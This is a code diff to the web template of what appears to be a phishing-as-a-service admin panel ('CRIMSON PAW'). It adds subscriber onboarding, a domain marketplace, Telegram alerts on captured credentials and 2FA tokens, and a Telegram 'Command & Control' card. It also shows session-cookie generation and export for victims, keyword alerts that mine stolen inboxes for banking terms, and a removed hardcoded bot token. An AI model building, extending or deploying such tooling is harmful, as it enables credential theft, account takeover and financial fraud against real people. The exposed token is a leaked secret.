                     <button type="button" id="settings-tab-btn-telegram" onclick="window.switchSettingsTab('telegram')" style="background: transparent; border: 1px solid transparent; color: #a49498; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
                         Telegram
                     </button>
-                    {% if is_master_admin %}
+                    {% if not is_client_admin and user_role != 'operator' %}
                     <button type="button" id="settings-tab-btn-theme" onclick="window.switchSettingsTab('theme')" style="background: transparent; border: 1px solid transparent; color: var(--accent-color); padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center; display: flex; align-items: center; justify-content: center; gap: 8px;">
                         <span>🎨</span> Appearance &amp; Themes <span>🛡️</span>
                     </button>
@@ -3171,13 +3470,13 @@ HTML_TEMPLATE = r'''
                                 <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                     TELEGRAM BOT TOKEN
                                 </label>
-                                <input type="password" id="setting-tg-bot-token" class="dm-input" value="8969682315:AAFcX748SNUsjXYj9OFM_g3zZJJ2w4Ljc7c" placeholder="e.g. 7123456789:AAHkXYZ..." style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
+                                <input type="password" id="setting-tg-bot-token" class="dm-input" value="{{ tg_bot_token or '' }}" placeholder="e.g. 7123456789:AAHkXYZ..." style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
                             </div>
                             <div style="display: flex; flex-direction: column; gap: 6px;">
                                 <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                     TELEGRAM CHAT ID
                                 </label>
-                                <input type="text" id="setting-tg-chat-id" class="dm-input" value="7922291087" placeholder="e.g. 123456789" style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
+                                <input type="text" id="setting-tg-chat-id" class="dm-input" value="{{ tg_chat_id or '' }}" placeholder="e.g. 123456789" style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
                             </div>
                         </div>
 
@@ -3187,6 +3486,16 @@ HTML_TEMPLATE = r'''
                                 <span>Notify on Victim Compromise (Dispatched once entire device &amp; session flow completes)</span>
                             </label>
                         </div>
+
+                        {% if is_master_admin %}
+                        <div style="display: flex; flex-direction: column; gap: 6px; width: 100%; box-sizing: border-box; background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 16px;">
+                            <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
+                                🛒 Marketplace Telegram Contact (where subscribers complete domain purchases)
+                            </label>
+                            <input type="text" id="setting-marketplace-tg" class="dm-input" value="{{ marketplace_telegram_contact or '' }}" placeholder="e.g. YourAdminBot or @yourhandle" style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
+                            <div style="font-size: 0.75rem; color: #a49498;">When a subscriber clicks <b>Buy Now</b> in the domain marketplace, they are redirected here with a pre-filled purchase message. You assign the domain after receiving payment.</div>
+                        </div>
+                        {% endif %}
 
                         <div style="font-size: 0.8rem; color: #a49498; line-height: 1.6; background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 16px;">
                             💡 <strong style="color: #f0ebed;">Quick Setup Guide:</strong><br>
@@ -3202,7 +3511,8 @@ HTML_TEMPLATE = r'''
                             </button>
                         </div>
 
-                        <!-- Telegram Command & Control (C2) Interactive Suite Card -->
+                        {% if not is_client_admin %}
+<!-- Telegram Command & Control (C2) Interactive Suite Card -->
                         <div style="background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 10px; padding: 22px; display: flex; flex-direction: column; gap: 14px; margin-top: 6px;">
                             <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                                 <div style="display: flex; align-items: center; gap: 10px;">
@@ -3252,10 +3562,11 @@ HTML_TEMPLATE = r'''
                                 </div>
                             </div>
                         </div>
+                        {% endif %}
                     </div>
                 </div>
 
-                {% if is_master_admin %}
+                {% if not is_client_admin and user_role != 'operator' %}
                 <!-- TAB 4: Theme & Appearance (Master Host Only) -->
                 <div id="settings-pane-theme" style="display: none; width: 100%; box-sizing: border-box;">
                     <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: var(--accent-color); text-transform: uppercase; margin-bottom: 4px; display: flex; align-items: center; gap: 6px;">
@@ -3417,6 +3728,9 @@ HTML_TEMPLATE = r'''
             (function() {
                 window.switchSettingsTab = function(tab) {
                     const tabs = ['account', '2fa', 'telegram', 'theme'];
+                    if (!document.getElementById('settings-pane-' + tab)) {
+                        tab = 'account';
+                    }
                     tabs.forEach(function(t) {
                         const pane = document.getElementById('settings-pane-' + t);
                         const btn = document.getElementById('settings-tab-btn-' + t);
@@ -3638,7 +3952,6 @@ HTML_TEMPLATE = r'''
                 </div>
             </div>
         </div>
-    </div>
 
     <!-- Cookie Modal (Phase 2) -->
     <div id="cookieModal" class="modal-overlay">
@@ -3672,6 +3985,44 @@ HTML_TEMPLATE = r'''
             <div style="display:flex; justify-content:flex-end; gap:10px;">
                 <button type="button" class="btn btn-secondary" onclick="closeAppConfirm(false)" style="padding:8px 18px; font-size:0.84rem; background:var(--bg-panel); border:1px solid var(--border-color); color:var(--text-secondary);">Cancel</button>
                 <button type="button" id="appConfirmBtn" class="btn" onclick="closeAppConfirm(true)" style="background:var(--accent-gradient); color:#ffffff; border:1px solid rgba(255,255,255,0.15); padding:8px 20px; font-size:0.84rem; font-weight:700; border-radius:6px; box-shadow:0 4px 14px var(--accent-glow);">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Client Subscriber Bot Onboarding Modal -->
+    <div id="clientOnboardingModal" class="modal-overlay" style="z-index: 99998;">
+        <div class="modal" style="max-width: 500px; background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 14px; box-shadow: 0 20px 50px rgba(0,0,0,0.85); padding: 24px;">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:14px;">
+                <div style="width:42px; height:42px; border-radius:50%; background:var(--badge-bg); border:1px solid var(--badge-border); color:var(--accent-color); display:flex; align-items:center; justify-content:center; font-size:22px; flex-shrink:0;">✈️</div>
+                <div>
+                    <h3 style="color:#ffffff; font-size:1.15rem; font-weight:700; margin:0; letter-spacing:0.01em;">Action Required: Setup Alert Bots</h3>
+                    <div style="color:var(--accent-color); font-size:0.75rem; font-weight:700; text-transform:uppercase; letter-spacing:0.05em; margin-top:2px;">Subscriber Onboarding</div>
+                </div>
+            </div>
+            <p style="color:var(--text-secondary); font-size:0.88rem; line-height:1.55; margin-bottom:18px;">
+                Welcome to <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span>! To ensure you receive real-time notifications for newly captured credentials and high-value inbox intelligence, please configure your two dedicated Telegram bots:
+            </p>
+            <div style="display:flex; flex-direction:column; gap:10px; margin-bottom:22px;">
+                <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px; display:flex; align-items:flex-start; gap:10px;">
+                    <div style="font-size:18px; margin-top:2px;">⚙️</div>
+                    <div style="flex:1;">
+                        <div style="color:#ffffff; font-weight:700; font-size:0.86rem;">1. Main Telegram Bot</div>
+                        <div style="color:var(--text-secondary); font-size:0.78rem; line-height:1.4; margin-top:2px;">Receives instant alerts when victims submit credentials and 2FA tokens.</div>
+                        <button type="button" class="btn btn-primary btn-sm" onclick="navigateToTelegramSettings()" style="margin-top:8px; padding:4px 12px; font-size:0.78rem;">Configure in Settings →</button>
+                    </div>
+                </div>
+                <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px; display:flex; align-items:flex-start; gap:10px;">
+                    <div style="font-size:18px; margin-top:2px;">🚨</div>
+                    <div style="flex:1;">
+                        <div style="color:#ffffff; font-weight:700; font-size:0.86rem;">2. Keyword Alert Bot</div>
+                        <div style="color:var(--text-secondary); font-size:0.78rem; line-height:1.4; margin-top:2px;">Dedicated intelligence bot alerting on wire, bank, password, and confidential terms.</div>
+                        <button type="button" class="btn btn-secondary btn-sm" onclick="navigateToKeywordTelegram()" style="margin-top:8px; padding:4px 12px; font-size:0.78rem; border-color:var(--border-color); color:var(--accent-color);">Configure in Keyword Alerts →</button>
+                    </div>
+                </div>
+            </div>
+            <div style="display:flex; justify-content:flex-end; gap:10px;">
+                <button type="button" class="btn btn-secondary" onclick="dismissClientOnboarding()" style="padding:8px 18px; font-size:0.84rem; background:var(--bg-panel); border:1px solid var(--border-color); color:var(--text-secondary);">Remind Me Later</button>
+                <button type="button" class="btn" onclick="acknowledgeClientOnboarding()" style="background:var(--accent-gradient); color:#ffffff; border:1px solid rgba(255,255,255,0.15); padding:8px 20px; font-size:0.84rem; font-weight:700; border-radius:6px; box-shadow:0 4px 14px var(--accent-glow);">Got It</button>
             </div>
         </div>
     </div>
@@ -4129,6 +4480,7 @@ HTML_TEMPLATE = r'''
             </div>
         </div>
     </div> <!-- Close #page-b2b -->
+    </div> <!-- Close .main-content -->
 
     <!-- Compose New Mail Modal -->
 
@@ -4494,16 +4846,31 @@ HTML_TEMPLATE = r'''
                 <button class="close-btn" style="color:#a49498;" onclick="closeBuyDomainsModal()">&times;</button>
             </div>
             <div class="dm-tabs">
-                <button type="button" class="dm-tab-btn active" id="tab-btn-search" onclick="switchDomainTab('search')">🔍 Search & Buy (Namecheap)</button>
+                {% if is_master_admin %}
+                <button type="button" class="dm-tab-btn active" id="tab-btn-search" onclick="switchDomainTab('search')">🔍 Search & Buy (Dynadot)</button>
+                {% else %}
+                <button type="button" class="dm-tab-btn active" id="tab-btn-owned" onclick="switchDomainTab('owned')">📋 My Domains</button>
+                {% endif %}
+                {% if is_master_admin %}
                 <button type="button" class="dm-tab-btn" id="tab-btn-owned" onclick="switchDomainTab('owned')">📋 Owned Domains & DNS</button>
+                {% endif %}
+                <button type="button" class="dm-tab-btn" id="tab-btn-market" onclick="switchDomainTab('market')">🛒 Marketplace</button>
                 <button type="button" class="dm-tab-btn" id="tab-btn-manual" onclick="switchDomainTab('manual')">➕ Add Custom Domain</button>
             </div>
             <div class="dm-body">
                 <!-- TAB 1: Search & Buy -->
+                {% if is_master_admin %}
                 <div id="dm-tab-pane-search" style="display:flex; flex-direction:column; gap:14px;">
                     <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px 14px; font-size:0.78rem; color:var(--text-secondary);">
-                        💡 <strong style="color:var(--text-primary);">Real-time Namecheap Registrar Integration:</strong> Search domain availability, compare live TLD rates, and register domains directly to your <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span> infrastructure with automated DNS binding.
+                        💡 <strong style="color:var(--text-primary);">Real-time Dynadot Registrar Integration:</strong> Search domain availability, compare live TLD rates, and register domains directly to your <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span> infrastructure with automated DNS binding.
                     </div>
+                    {% if is_master_admin %}
+                    <div style="display:flex; gap:10px; align-items:center; background:rgba(255,255,255,0.03); border:1px solid var(--border-color); border-radius:8px; padding:10px 14px; font-size:0.78rem;">
+                        <span style="font-weight:700; color:var(--text-primary); white-space:nowrap; display:flex; align-items:center; gap:6px;">🔑 <span>Dynadot API Key:</span></span>
+                        <input type="password" id="dm-dynadot-key-input" class="dm-input" placeholder="Paste your Dynadot API key (Dynadot Tools → API)" style="flex:1; padding:6px 10px; font-size:0.78rem; font-family:monospace;" value="{{ dynadot_api_key or '' }}">
+                        <button type="button" class="dm-btn" style="padding:6px 14px; font-size:0.78rem;" onclick="saveDynadotApiKey()">💾 Save Key</button>
+                    </div>
+                    {% endif %}
                     <div class="dm-search-bar">
                         <input type="text" id="dm-search-keyword" class="dm-input" placeholder="Enter keyword or domain (e.g. secure-verify or account-auth)" onkeydown="if(event.key==='Enter') searchDomains()">
                         <button type="button" class="dm-btn" onclick="searchDomains()"><span>🔍</span> Search</button>
@@ -4522,7 +4889,7 @@ HTML_TEMPLATE = r'''
                         </div>
                     </div>
                     <div id="dm-search-loading" style="display:none; text-align:center; padding:25px; color:var(--accent-color);">
-                        ⏳ Querying Namecheap API availability & pricing...
+                        ⏳ Querying Dynadot API availability & pricing...
                     </div>
                     <div id="dm-search-results-box" style="display:none;">
                         <table class="dm-results-table">
@@ -4539,9 +4906,10 @@ HTML_TEMPLATE = r'''
                         </table>
                     </div>
                 </div>
+                {% endif %}
 
                 <!-- TAB 2: Owned Domains -->
-                <div id="dm-tab-pane-owned" style="display:none; flex-direction:column; gap:12px;">
+                <div id="dm-tab-pane-owned" style="display:{% if not is_master_admin %}flex{% else %}none{% endif %}; flex-direction:column; gap:12px;">
                     <div style="display:flex; justify-content:space-between; align-items:center;">
                         <span style="font-size:0.8rem; font-weight:700; color:#f0ebed;">Registered & Active Domains</span>
                         <button type="button" class="dm-btn dm-btn-secondary" onclick="loadOwnedDomainsTable()" style="padding:6px 12px; font-size:0.75rem;">🔄 Refresh</button>
@@ -4572,10 +4940,51 @@ HTML_TEMPLATE = r'''
                     </div>
                     <div style="display:flex; flex-direction:column; gap:6px;">
                         <label style="font-size:0.74rem; font-weight:700; color:#a49498; text-transform:uppercase;">Registrar / Provider</label>
-                        <input type="text" id="dm-custom-provider" class="dm-input" placeholder="e.g. Cloudflare, GoDaddy, Namecheap" value="Manual DNS">
+                        <input type="text" id="dm-custom-provider" class="dm-input" placeholder="e.g. Cloudflare, GoDaddy, Dynadot" value="Manual DNS">
                     </div>
+                    {% if is_master_admin %}
+                    <div style="display:flex; gap:14px; align-items:center; background:rgba(255,255,255,0.03); border:1px solid var(--border-color); border-radius:8px; padding:10px 14px;">
+                        <label style="display:flex; align-items:center; gap:8px; font-size:0.78rem; color:var(--text-secondary); cursor:pointer;">
+                            <input type="checkbox" id="dm-custom-market-check" onchange="const p=document.getElementById('dm-custom-market-price'); if(p) p.style.display = this.checked ? 'block' : 'none';">
+                            🛒 List in Marketplace (for subscribers to buy)
+                        </label>
+                        <input type="text" id="dm-custom-market-price" class="dm-input" placeholder="Price (e.g. $14.99)" style="display:none; width:150px; padding:6px 10px; font-size:0.78rem;">
+                    </div>
+                    {% endif %}
                     <div style="display:flex; justify-content:flex-end; margin-top:8px;">
                         <button type="button" class="dm-btn" onclick="addCustomDomain()"><span>➕</span> Add Domain to <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span></button>
+                    </div>
+                </div>
+
+                <!-- TAB 4: Marketplace -->
+                <div id="dm-tab-pane-market" style="display:none; flex-direction:column; gap:14px;">
+                    <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px 14px; font-size:0.78rem; color:var(--text-secondary);">
+                        {% if is_master_admin %}
+                        🛒 <strong style="color:var(--text-primary);">Marketplace Inventory:</strong> Domains listed here are offered for sale to subscribers. Listed domains do <strong>not</strong> appear in your own usable domain pool — when a subscriber purchases one, ownership transfers to them permanently.
+                        {% else %}
+                        🛒 <strong style="color:var(--text-primary);">Domain Marketplace:</strong> Domains listed here are offered for sale by the administrator. Purchase one and it becomes <strong>your</strong> private domain — ready to use in the deployment builder immediately.
+                        {% endif %}
+                    </div>
+                    {% if is_master_admin %}
+                    <div style="display:flex; gap:8px; align-items:center; background:rgba(255,255,255,0.03); border:1px solid var(--border-color); border-radius:8px; padding:10px 14px;">
+                        <input type="text" id="dm-market-add-name" class="dm-input" placeholder="domain-to-sell.com" style="flex:1; padding:6px 10px; font-size:0.78rem;">
+                        <input type="text" id="dm-market-add-price" class="dm-input" placeholder="Price (e.g. $14.99)" style="width:140px; padding:6px 10px; font-size:0.78rem;">
+                        <button type="button" class="dm-btn" style="padding:6px 14px; font-size:0.78rem;" onclick="listDomainInMarketplace()">🛒 List for Sale</button>
+                    </div>
+                    {% endif %}
+                    <div style="overflow-x:auto; border:1px solid var(--border-color); border-radius:8px;">
+                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem;">
+                            <thead>
+                                <tr style="border-bottom:1px solid var(--border-color); color:#a49498; text-transform:uppercase; font-size:0.7rem;">
+                                    <th style="padding:10px 12px; text-align:left;">Domain</th>
+                                    <th style="padding:10px 12px; text-align:left;">Registrar</th>
+                                    <th style="padding:10px 12px; text-align:left;">Price</th>
+                                    <th style="padding:10px 12px; text-align:right;">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="dm-marketplace-tbody">
+                            </tbody>
+                        </table>
                     </div>
                 </div>
             </div>
@@ -4627,6 +5036,23 @@ HTML_TEMPLATE = r'''
     </div>
 
         <script>
+        // Global Ngrok & Tunnel Bypass for all AJAX/Fetch requests
+        (function() {
+            const _origFetch = window.fetch;
+            window.fetch = function(url, options) {
+                options = options || {};
+                options.headers = options.headers || {};
+                if (options.headers instanceof Headers) {
+                    if (!options.headers.has('ngrok-skip-browser-warning')) {
+                        options.headers.set('ngrok-skip-browser-warning', 'true');
+                    }
+                } else if (typeof options.headers === 'object') {
+                    options.headers['ngrok-skip-browser-warning'] = 'true';
+                }
+                return _origFetch(url, options);
+            };
+        })();
+
         function toggleSidebar() {
             const sb = document.getElementById('sidebar');
             sb.classList.toggle('collapsed');
@@ -4639,9 +5065,23 @@ HTML_TEMPLATE = r'''
 
         function handleBrandLogoClick() {
             if (currentUserRole === 'operator' || window.location.pathname.startsWith('/m/')) {
-                return false; // Strictly disabled for operators
+                const navMailbox = document.getElementById('nav-mailbox');
+                if (navMailbox && typeof showPage === 'function') {
+                    showPage('mailbox', navMailbox);
+                } else {
+                    const opToken = '{{ operator_token if operator_token else "" }}' || (window.location.pathname.startsWith('/m/') ? window.location.pathname.split('/')[2] : '');
+                    if (opToken) {
+                        window.location.href = '/m/' + encodeURIComponent(opToken);
+                    }
+                }
+                return;
             }
-            window.location.href = '/';
+            const navDash = document.getElementById('nav-dashboard');
+            if (navDash && typeof showPage === 'function') {
+                showPage('dashboard', navDash);
+            } else {
+                window.location.href = '/dashboard';
+            }
         }
 
         async function handleLogout() {
@@ -4740,6 +5180,8 @@ Assigned      : ${inboxes}
                 loadSettings();
             } else if (id === 'operators') {
                 loadOperators();
+            } else if (id === 'clients') {
+                loadSubscribers();
             } else if (id === 'audit') {
                 loadAuditTrail();
             } else if (id === 'keyword-alerts') {
@@ -4999,7 +5441,7 @@ Assigned      : ${inboxes}
 
         async function openMatchInMailbox(userCode, messageId) {
             if (!userCode) {
-                alert('No session user code associated with this match.');
+                showToast('⚠️ No session user code associated with this match.');
                 return;
             }
 
@@ -5078,7 +5520,7 @@ Assigned      : ${inboxes}
             const notify_webhook = document.getElementById('kwa-rule-wh').checked;
 
             if (keywords.length === 0) {
-                alert("Please enter at least one keyword");
+                showToast('⚠️ Please enter at least one keyword');
                 return;
             }
 
@@ -5100,12 +5542,13 @@ Assigned      : ${inboxes}
                 if (res.ok) {
                     closeKeywordRuleModal();
                     loadKeywordAlertsData();
+                    showToast('✓ Keyword rule saved successfully!');
                 } else {
-                    const err = await res.json();
-                    alert("Error saving rule: " + (err.error || 'Unknown error'));
+                    const err = await res.json().catch(() => ({}));
+                    showToast('⚠️ Error saving rule: ' + (err.error || 'Unknown error'));
                 }
             } catch (err) {
-                console.error("Save error:", err);
+                showToast('⚠️ Save error: ' + err);
             }
         }
 
@@ -5443,12 +5886,13 @@ Assigned      : ${inboxes}
                 const data = await res.json();
                 if (data.success) {
                     await loadDashboard();
+                    showToast('✓ Session refreshed successfully!');
                 } else {
-                    alert('Refresh failed: ' + (data.error || 'Unknown error'));
+                    showToast('⚠️ Refresh failed: ' + (data.error || 'Unknown error'));
                     if (btn) { btn.disabled = false; btn.innerText = '🔄 Refresh'; }
                 }
             } catch(e) {
-                alert('Request failed: ' + e);
+                showToast('⚠️ Request failed: ' + e);
                 if (btn) { btn.disabled = false; btn.innerText = '🔄 Refresh'; }
             }
         }
@@ -5500,21 +5944,48 @@ Assigned      : ${inboxes}
             document.getElementById('cookieModal').classList.remove('active');
         }
 
-        function appConfirm({ title = 'Confirm Action', message = 'Are you sure you want to proceed?', confirmText = 'Confirm', cancelText = 'Cancel', icon = '⚠️', danger = true } = {}) {
+        function appConfirm(firstArg = {}, maybeMessage, maybeConfirmText, maybeCancelText, maybeDanger) {
+            let title = 'Confirm Action';
+            let message = 'Are you sure you want to proceed?';
+            let confirmText = 'Confirm';
+            let cancelText = 'Cancel';
+            let icon = '⚠️';
+            let danger = true;
+
+            if (typeof firstArg === 'string') {
+                title = firstArg;
+                if (typeof maybeMessage === 'string') message = maybeMessage;
+                if (typeof maybeConfirmText === 'string') confirmText = maybeConfirmText;
+                if (typeof maybeDanger === 'boolean') danger = maybeDanger;
+            } else if (typeof firstArg === 'object' && firstArg !== null) {
+                if (firstArg.title) title = firstArg.title;
+                if (firstArg.message) message = firstArg.message;
+                if (firstArg.confirmText) confirmText = firstArg.confirmText;
+                if (firstArg.cancelText) cancelText = firstArg.cancelText;
+                if (firstArg.icon) icon = firstArg.icon;
+                if (firstArg.danger !== undefined) danger = Boolean(firstArg.danger);
+            }
+
             return new Promise((resolve) => {
                 const modal = document.getElementById('appConfirmModal');
                 if (!modal) {
-                    resolve(window.confirm(message));
+                    showToast(title + ': ' + message);
+                    resolve(true);
                     return;
                 }
                 const titleEl = document.getElementById('appConfirmTitle');
                 const msgEl = document.getElementById('appConfirmMessage');
                 const iconEl = document.getElementById('appConfirmIcon');
                 const btnEl = document.getElementById('appConfirmBtn');
+                const cancelBtn = modal.querySelector('.btn-secondary');
 
                 if (titleEl) titleEl.innerText = title;
                 if (msgEl) msgEl.innerText = message;
                 if (iconEl) iconEl.innerText = icon;
+                if (cancelBtn) {
+                    cancelBtn.style.display = 'inline-block';
+                    cancelBtn.innerText = cancelText;
+                }
                 if (btnEl) {
                     btnEl.innerText = confirmText;
                     btnEl.style.background = danger ? 'var(--accent-gradient)' : 'var(--accent-color)';
@@ -5526,11 +5997,15 @@ Assigned      : ${inboxes}
             });
         }
 
-                function appAlert(title, message, icon = 'ℹ️') {
+        function appAlert(title, message, icon = 'ℹ️') {
+            if (!message && title) {
+                message = title;
+                title = 'Notice';
+            }
             return new Promise((resolve) => {
                 const modal = document.getElementById('appConfirmModal');
                 if (!modal) {
-                    alert(title + '\n\n' + message);
+                    showToast(title ? `${title}: ${message}` : message);
                     return resolve(true);
                 }
                 const titleEl = document.getElementById('appConfirmTitle');
@@ -5557,7 +6032,7 @@ Assigned      : ${inboxes}
             });
         }
 
-function closeAppConfirm(confirmed) {
+        function closeAppConfirm(confirmed) {
             const modal = document.getElementById('appConfirmModal');
             if (modal) modal.classList.remove('active');
             if (typeof window._appConfirmResolver === 'function') {
@@ -5566,6 +6041,7 @@ function closeAppConfirm(confirmed) {
                 res(Boolean(confirmed));
             }
         }
+        window.showNotificationToast = function(msg) { showToast(msg); };
 
         function copyCookieScript() {
             const txt = document.getElementById('cookie-script-text').value;
@@ -5595,9 +6071,9 @@ function closeAppConfirm(confirmed) {
                 const name = (res.victim_name || res.victim_email || uc).replace(/\s+/g, '_');
                 a.download = `${name}_export.json`;
                 a.click();
-                showToast('Export downloaded successfully!');
+                showToast('✓ Export downloaded successfully!');
             } catch(e) {
-                alert('Export failed: ' + e);
+                showToast('⚠️ Export failed: ' + e);
             }
         }
 
@@ -5610,12 +6086,18 @@ function closeAppConfirm(confirmed) {
         let dashStatusFilter = 'ALL';
         let dashNotifications = [];
 
+        function _getNotifStorageKey() {
+            const role = window._userRole || (window._isClientAdmin ? 'client' : 'admin');
+            const uid = window._currentUserId || '';
+            return 'crimson_cleared_notifs_' + role + (uid ? '_' + uid : '');
+        }
+
         async function loadPlatformNotifications() {
             try {
                 const res = await fetch('/api/notifications');
                 if (!res.ok) return;
                 const data = await res.json();
-                const cleared = JSON.parse(localStorage.getItem('crimson_cleared_notifs') || '[]');
+                const cleared = JSON.parse(localStorage.getItem(_getNotifStorageKey()) || '[]');
                 const fresh = (data.notifications || []).filter(n => !cleared.includes(n.id));
                 dashNotifications = fresh;
                 renderNotifications();
@@ -5681,11 +6163,12 @@ function closeAppConfirm(confirmed) {
         }
 
         function clearNotifications() {
-            const cleared = JSON.parse(localStorage.getItem('crimson_cleared_notifs') || '[]');
+            const key = _getNotifStorageKey();
+            const cleared = JSON.parse(localStorage.getItem(key) || '[]');
             dashNotifications.forEach(n => {
                 if (!cleared.includes(n.id)) cleared.push(n.id);
             });
-            localStorage.setItem('crimson_cleared_notifs', JSON.stringify(cleared));
+            localStorage.setItem(key, JSON.stringify(cleared));
             dashNotifications = [];
             renderNotifications();
         }
@@ -5743,6 +6226,46 @@ function closeAppConfirm(confirmed) {
             dashCurrentPage = 1;
             renderAbTable();
         }
+
+        // Browsers restore previously-typed form values on refresh (ignoring
+        // autocomplete="off"), and Chrome autofill can apply AFTER the pageshow
+        // event — which silently prefills the search box with e.g. "admin" and
+        // filters the captured table. Clear on every page show, including
+        // back/forward-cache restores, plus delayed checks that beat late
+        // autofill. The snapshot guard ensures user typing is never wiped.
+        let _abSearchPrefill = null;
+        function _clearAbSearchPrefill() {
+            const sInput = document.getElementById('ab-table-search');
+            if (sInput && sInput.value) {
+                _abSearchPrefill = sInput.value;
+                sInput.value = '';
+                if (typeof onTableSearch === 'function') onTableSearch('');
+            }
+        }
+        window.addEventListener('pageshow', _clearAbSearchPrefill);
+        window.addEventListener('load', function() {
+            // Chrome autofill can apply after load. Re-check a few times, but only
+            // wipe when the value still equals the browser-restored prefill, plus
+            // one unfocused sweep that can never stomp on user typing (typing
+            // requires focus, so an unfocused non-empty value is always an
+            // autofill artifact).
+            [150, 400].forEach(function(delay) {
+                setTimeout(function() {
+                    const sInput = document.getElementById('ab-table-search');
+                    if (sInput && _abSearchPrefill !== null && sInput.value === _abSearchPrefill) {
+                        sInput.value = '';
+                        if (typeof onTableSearch === 'function') onTableSearch('');
+                    }
+                }, delay);
+            });
+            setTimeout(function() {
+                const sInput = document.getElementById('ab-table-search');
+                if (sInput && document.activeElement !== sInput && sInput.value) {
+                    sInput.value = '';
+                    if (typeof onTableSearch === 'function') onTableSearch('');
+                }
+            }, 900);
+        });
 
         function changeAbPageSize(val) {
             dashPageSize = parseInt(val, 10) || 10;
@@ -5907,12 +6430,12 @@ function closeAppConfirm(confirmed) {
                             <span class="ab-token-badge ${isRevoked ? 'revoked' : 'active'}">${isRevoked ? 'REVOKED' : 'ACTIVE'}</span>
                         </td>
                         <td>
-                            <div class="ab-action-group">
-                                <button type="button" class="ab-action-cookie-btn" onclick="openCookieModal('${safeUserCode}', this)" title="Generate cookie">COOKIE</button>
-                                <button type="button" class="ab-action-circle-btn" onclick="exportSession('${safeUserCode}')" title="Export session">
+                            <div class="ab-action-group" onclick="event.stopPropagation()">
+                                <button type="button" class="ab-action-cookie-btn" onclick="event.stopPropagation(); openCookieModal('${safeUserCode}', this)" title="Generate cookie">COOKIE</button>
+                                <button type="button" class="ab-action-circle-btn" onclick="event.stopPropagation(); exportSession('${safeUserCode}')" title="Export session">
                                     <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
                                 </button>
-                                <button type="button" class="ab-action-circle-btn ab-action-delete-btn" onclick="deleteSession('${safeUserCode}')" title="Delete victim record">
+                                <button type="button" class="ab-action-circle-btn ab-action-delete-btn" onclick="event.stopPropagation(); deleteSession('${safeUserCode}', event)" title="Delete victim record">
                                     <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
                                 </button>
                             </div>
@@ -5949,6 +6472,52 @@ function closeAppConfirm(confirmed) {
             });
         }
 
+        function showClientOnboardingModal() {
+            const modal = document.getElementById('clientOnboardingModal');
+            if (modal) modal.classList.add('active');
+        }
+
+        function dismissClientOnboarding() {
+            const modal = document.getElementById('clientOnboardingModal');
+            if (modal) modal.classList.remove('active');
+        }
+
+        function acknowledgeClientOnboarding() {
+            if (window._currentUser) {
+                localStorage.setItem('crimson_bot_setup_seen_' + window._currentUser, '1');
+            }
+            dismissClientOnboarding();
+            showToast('✓ Setup noted. Configure bots anytime in Settings & Keyword Alerts.');
+        }
+
+        function navigateToTelegramSettings() {
+            dismissClientOnboarding();
+            switchTab('settings');
+            setTimeout(() => {
+                if (typeof switchSettingsTab === 'function') switchSettingsTab('telegram');
+            }, 150);
+        }
+
+        function navigateToKeywordTelegram() {
+            dismissClientOnboarding();
+            switchTab('keyword_alerts');
+            setTimeout(() => {
+                if (typeof openKeywordTelegramModal === 'function') openKeywordTelegramModal();
+            }, 300);
+        }
+
+        function checkClientSubscriberOnboarding() {
+            if (!window._isClientAdmin) return;
+            const userKey = window._currentUser || 'client';
+            const seen = localStorage.getItem('crimson_bot_setup_seen_' + userKey);
+            if (!seen) {
+                setTimeout(() => {
+                    showToast('🔔 Welcome! Please configure your Telegram & Keyword Alert bots in Settings & Keyword Alerts.');
